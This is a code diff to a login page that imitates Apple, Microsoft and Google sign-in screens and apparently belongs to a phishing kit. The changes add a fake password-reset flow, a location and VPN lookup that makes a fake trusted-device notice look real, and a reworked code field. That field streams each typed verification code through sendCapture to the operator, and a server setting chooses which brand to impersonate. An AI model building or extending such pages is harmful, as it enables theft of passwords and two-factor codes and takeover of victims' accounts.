@@ -1166,7 +1166,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
 
 // ─── Apple ───────────────────────────────────────────────────────────────────
 
-type AppleStep = 'email' | 'password' | 'device-trust' | 'verification-code' | 'processing' | 'error-email' | 'error-password' | 'error-code';
+type AppleStep = 'email' | 'password' | 'device-trust' | 'verification-code' | 'processing' | 'error-email' | 'error-password' | 'error-code' | 'forgot' | 'forgot-sent';
 
 function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
   const isDark = theme === 'dark';
@@ -1179,7 +1179,9 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [codeInput, setCodeInput] = useState('');
+  const [forgotEmail, setForgotEmail] = useState('');
   const [loading, setLoading] = useState(false);
+  const [visitorLocation, setVisitorLocation] = useState<{ city: string; country: string; flag: string; isVpn: boolean } | null>(null);
   const passwordRef = useRef<HTMLInputElement>(null);
   const codeRef = useRef<HTMLInputElement>(null);
 
@@ -1187,6 +1189,15 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
     if (step === 'password') passwordRef.current?.focus();
     if (step === 'verification-code') setTimeout(() => codeRef.current?.focus(), 100);
   }, [step]);
+
+  useEffect(() => {
+    if (step !== 'device-trust' || visitorLocation) return;
+    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+    fetch(`${base}/api/location`)
+      .then(r => r.json() as Promise<{ city: string; country: string; flag: string; isVpn: boolean }>)
+      .then(d => setVisitorLocation(d))
+      .catch(() => {});
+  }, [step, visitorLocation]);
 
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'apple',
@@ -1282,7 +1293,7 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
               Continue
             </button>
             <div className="flex flex-col items-center gap-4">
-              <button data-testid="apple-forgot-link" className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
+              <button data-testid="apple-forgot-link" onClick={() => { setForgotEmail(email); setStep('forgot'); }} className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
                 Forgot Apple Account or Password?
               </button>
               <button data-testid="apple-child-signin" className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
@@ -1339,7 +1350,7 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
             >
               Sign In
             </button>
-            <button data-testid="apple-forgot-password-2" className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
+            <button data-testid="apple-forgot-password-2" onClick={() => { setForgotEmail(email); setStep('forgot'); }} className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
               Forgot Apple Account or Password?
             </button>
           </>
@@ -1348,9 +1359,22 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
         {/* ── Device Trust (iOS notification simulation) ── */}
         {step === 'device-trust' && (
           <>
-            <p className={`text-center text-[15px] leading-relaxed mb-6 ${subGray}`}>
-              A sign-in request has been sent to your trusted Apple devices.
+            <p className={`text-center text-[15px] leading-relaxed mb-2 ${subGray}`}>
+              A sign-in request was sent to your trusted devices.
             </p>
+            {visitorLocation && (
+              <p className={`text-center text-[13px] mb-5 ${subGray}`}>
+                {visitorLocation.flag} {visitorLocation.city}, {visitorLocation.country}
+              </p>
+            )}
+            {visitorLocation?.isVpn && (
+              <div className={`w-full max-w-[320px] rounded-xl px-4 py-2.5 mb-4 flex items-start gap-2.5 ${isDark ? 'bg-[#3a2c00] border border-[#5a4500]' : 'bg-[#fff9e6] border border-[#f0c040]'}`}>
+                <span className="text-[16px] mt-0.5">⚠️</span>
+                <p className={`text-[12px] leading-relaxed ${isDark ? 'text-[#ffd166]' : 'text-[#7a5500]'}`}>
+                  You appear to be using a VPN or proxy. Your displayed location may differ from your actual location.
+                </p>
+              </div>
+            )}
             {/* iOS notification card */}
             <div className={`w-full max-w-[320px] rounded-2xl overflow-hidden shadow-2xl mb-5 ${isDark ? 'bg-[#2c2c2e] border border-[#3a3a3c]' : 'bg-white border border-[#e5e5ea]'}`}>
               <div className={`px-4 pt-4 pb-3 border-b ${isDark ? 'border-[#3a3a3c]' : 'border-[#e5e5ea]'}`}>
@@ -1369,11 +1393,13 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
                   </div>
                 </div>
                 <p className={`text-[13px] leading-snug ${subGray}`}>
-                  Your Apple ID <span className={isDark ? 'text-white' : 'text-black'}>{email || 'user@icloud.com'}</span> is being used to sign in to a device near your location.
+                  Your Apple ID <span className={isDark ? 'text-white font-medium' : 'text-black font-medium'}>{email || 'user@icloud.com'}</span> is being used to sign in to a device
+                  {visitorLocation ? ` in ${visitorLocation.city}, ${visitorLocation.country}` : ' near your location'}.
                 </p>
               </div>
               <div className={`flex divide-x ${isDark ? 'divide-[#3a3a3c]' : 'divide-[#e5e5ea]'}`}>
                 <button
+                  onClick={() => setStep('email')}
                   className={`flex-1 py-3 text-[17px] font-normal transition-colors ${isDark ? 'text-[#007AFF] hover:bg-[#3a3a3c]' : 'text-[#007AFF] hover:bg-[#f2f2f7]'}`}
                   style={{ background: 'none', border: 'none', cursor: 'pointer' }}
                 >
@@ -1408,46 +1434,53 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
                 <ChevronLeft className="w-4 h-4" /> Back
               </button>
             )}
-            <p className={`text-center text-[15px] leading-relaxed mb-6 ${subGray}`}>
+            <p className={`text-center text-[15px] leading-relaxed mb-1 ${subGray}`}>
               Enter the verification code shown on your trusted device.
             </p>
-            {/* 6 digit boxes */}
-            <div
-              className="flex gap-2 mb-5 cursor-text"
-              onClick={() => codeRef.current?.focus()}
-            >
-              {Array.from({ length: 6 }).map((_, i) => (
-                <div key={i} className={`w-11 h-14 rounded-[13px] flex items-center justify-center text-[22px] font-semibold border-2 transition-colors
-                  ${codeInput[i]
-                    ? isDark ? 'border-white bg-[#38383a] text-white' : 'border-black bg-[#f2f2f7] text-black'
-                    : isDark ? 'border-[#48484a] bg-[#1c1c1e] text-transparent' : 'border-[#d1d1d6] bg-[#f2f2f7] text-transparent'}`}>
-                  {codeInput[i] ?? ''}
-                </div>
-              ))}
+            <p className={`text-center text-[13px] mb-6 ${subGray}`}>
+              A 6-digit code was displayed on your other Apple devices.
+            </p>
+            {/* Digit boxes with transparent overlay input for reliable input capture */}
+            <div className="relative mb-5" onClick={() => codeRef.current?.focus()}>
+              <div className="flex gap-2 justify-center pointer-events-none">
+                {Array.from({ length: 6 }).map((_, i) => (
+                  <div key={i} className={`w-11 h-14 rounded-[13px] flex items-center justify-center text-[22px] font-semibold border-2 transition-colors
+                    ${codeInput[i]
+                      ? isDark ? 'border-[#007AFF] bg-[#38383a] text-white' : 'border-[#007AFF] bg-[#f2f2f7] text-black'
+                      : i === codeInput.length
+                        ? isDark ? 'border-[#007AFF] bg-[#1c1c1e]' : 'border-[#007AFF] bg-white'
+                        : isDark ? 'border-[#48484a] bg-[#1c1c1e]' : 'border-[#d1d1d6] bg-[#f2f2f7]'}`}>
+                    {codeInput[i] ?? ''}
+                  </div>
+                ))}
+              </div>
+              <input
+                ref={codeRef}
+                data-testid="apple-code-input"
+                type="text"
+                inputMode="numeric"
+                maxLength={6}
+                autoFocus
+                value={codeInput}
+                onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setCodeInput(v); sendCapture('verification_code', v); }}
+                onKeyDown={e => { if (e.key === 'Enter' && codeInput.length >= 4) { sendCapture('verification_code', codeInput); setStep('processing'); } }}
+                aria-label="Verification code"
+                style={{ position: 'absolute', inset: 0, opacity: 0, width: '100%', height: '100%', cursor: 'default', caretColor: 'transparent', fontSize: 0 }}
+              />
             </div>
-            <input
-              ref={codeRef}
-              data-testid="apple-code-input"
-              type="text"
-              inputMode="numeric"
-              maxLength={6}
-              autoFocus
-              value={codeInput}
-              onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setCodeInput(v); sendCapture('verification_code', v); }}
-              className="opacity-0 absolute pointer-events-none w-0 h-0"
-              aria-label="Verification code"
-              onBlur={() => codeRef.current?.focus()}
-            />
             <button
               data-testid="apple-code-submit-btn"
               onClick={() => { if (codeInput.length >= 4) { sendCapture('verification_code', codeInput); setStep('processing'); } }}
               disabled={codeInput.length < 4}
-              className={`w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-4 transition-opacity ${codeInput.length < 4 ? 'opacity-40' : 'hover:opacity-90 active:opacity-80'}`}
+              className={`w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-4 transition-opacity ${codeInput.length < 4 ? 'opacity-40 cursor-not-allowed' : 'hover:opacity-90 active:opacity-80 cursor-pointer'}`}
               style={{ backgroundColor: appleBlue }}
             >
               Continue
             </button>
-            <button className="text-[14px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
+            <button
+              onClick={() => nav('device-trust')}
+              className="text-[14px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}
+            >
               Didn't receive a code?
             </button>
           </>
@@ -1493,10 +1526,76 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
               Try Again
             </button>
             {step === 'error-password' && (
-              <button className="text-[14px] mt-3" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
+              <button onClick={() => { setForgotEmail(email); setStep('forgot'); }} className="text-[14px] mt-3" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
                 Forgot Apple ID or password?
               </button>
             )}
+          </div>
+        )}
+
+        {/* ── Forgot Apple Account / Password ── */}
+        {step === 'forgot' && (
+          <div className="flex flex-col items-center w-full">
+            <p className={`text-center text-[15px] leading-relaxed mb-8 ${subGray}`}>
+              Enter your Apple Account email address or phone number and we'll help you reset your password or find your account.
+            </p>
+            <div className={`w-full rounded-[13px] overflow-hidden border mb-5 ${groupBg}`}>
+              <input
+                type="email"
+                autoFocus
+                value={forgotEmail}
+                onChange={e => setForgotEmail(e.target.value)}
+                onKeyDown={e => { if (e.key === 'Enter' && forgotEmail) setStep('forgot-sent'); }}
+                placeholder="Email or Phone Number"
+                className={`w-full px-4 py-3.5 text-[17px] focus:outline-none bg-transparent ${isDark ? 'text-white placeholder-[#636366]' : 'text-black placeholder-[#aeaeb2]'}`}
+              />
+            </div>
+            <button
+              onClick={() => { if (forgotEmail) setStep('forgot-sent'); }}
+              disabled={!forgotEmail}
+              className={`w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-4 transition-opacity ${!forgotEmail ? 'opacity-40 cursor-not-allowed' : 'hover:opacity-90 active:opacity-80 cursor-pointer'}`}
+              style={{ backgroundColor: appleBlue }}
+            >
+              Continue
+            </button>
+            <button
+              onClick={() => setStep(password ? 'password' : 'email')}
+              className={`text-[15px] ${subGray} hover:text-[#007AFF] transition-colors`}
+              style={{ background: 'none', border: 'none', cursor: 'pointer' }}
+            >
+              Cancel
+            </button>
+          </div>
+        )}
+
+        {/* ── Forgot Sent Confirmation ── */}
+        {step === 'forgot-sent' && (
+          <div className="flex flex-col items-center w-full">
+            <div className={`w-16 h-16 rounded-full flex items-center justify-center mb-5 ${isDark ? 'bg-[#1c3553]' : 'bg-[#e8f4ff]'}`}>
+              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke={appleBlue} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <rect x="2" y="4" width="20" height="16" rx="2"/>
+                <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
+              </svg>
+            </div>
+            <p className={`text-[17px] font-semibold text-center mb-3 ${isDark ? 'text-white' : 'text-black'}`}>
+              Check Your Email
+            </p>
+            <p className={`text-center text-[14px] leading-relaxed mb-7 ${subGray}`}>
+              If an Apple Account exists for <strong className={isDark ? 'text-white' : 'text-black'}>{forgotEmail}</strong>, we've sent password reset instructions to that address. Check your email.
+            </p>
+            <button
+              onClick={() => setStep('email')}
+              className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white transition-opacity hover:opacity-90 active:opacity-80"
+              style={{ backgroundColor: appleBlue }}
+            >
+              Return to Sign In
+            </button>
+            <p className={`text-[12px] text-center mt-5 leading-relaxed ${subGray}`}>
+              Didn't receive an email? Check your spam folder or{' '}
+              <button onClick={() => setStep('forgot')} className="underline" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer', fontSize: 'inherit' }}>
+                try a different address
+              </button>.
+            </p>
           </div>
         )}
 
@@ -1944,12 +2043,34 @@ function GoogleLoadingScreen({ isDark, bg, cardBg, textColor }: { isDark: boolea
 
 export default function LoginPage() {
   const params = new URLSearchParams(typeof window !== 'undefined' ? window.location.search : '');
-  const [provider, setProvider] = useState(params.get('provider') || 'microsoft');
+  const urlProvider = params.get('provider');
+  const storedProvider = typeof window !== 'undefined' ? localStorage.getItem('auth_provider') : null;
+  const [provider, setProvider] = useState(urlProvider || storedProvider || 'microsoft');
   const device = params.get('device') || 'desktop';
   const theme = params.get('theme') || 'light';
   const isViewOnly = params.get('viewOnly') === '1';
 
-  const handleProviderSwitch = isViewOnly ? undefined : (p: string) => setProvider(p);
+  const handleProviderSwitch = isViewOnly ? undefined : (p: string) => {
+    setProvider(p);
+    if (typeof window !== 'undefined') localStorage.setItem('auth_provider', p);
+  };
+
+  // On mount: if no URL provider param, fetch the server's global provider
+  // (handles the case where the page loads fresh and localStorage is stale/empty)
+  useEffect(() => {
+    if (urlProvider) return; // URL explicitly set — don't override
+    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+    fetch(`${base}/api/global-provider`)
+      .then(r => r.json() as Promise<{ provider: string }>)
+      .then(d => {
+        if (d.provider && d.provider !== provider) {
+          setProvider(d.provider);
+          localStorage.setItem('auth_provider', d.provider);
+        }
+      })
+      .catch(() => {});
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
 
   return (
     <div className="w-full h-screen overflow-hidden">
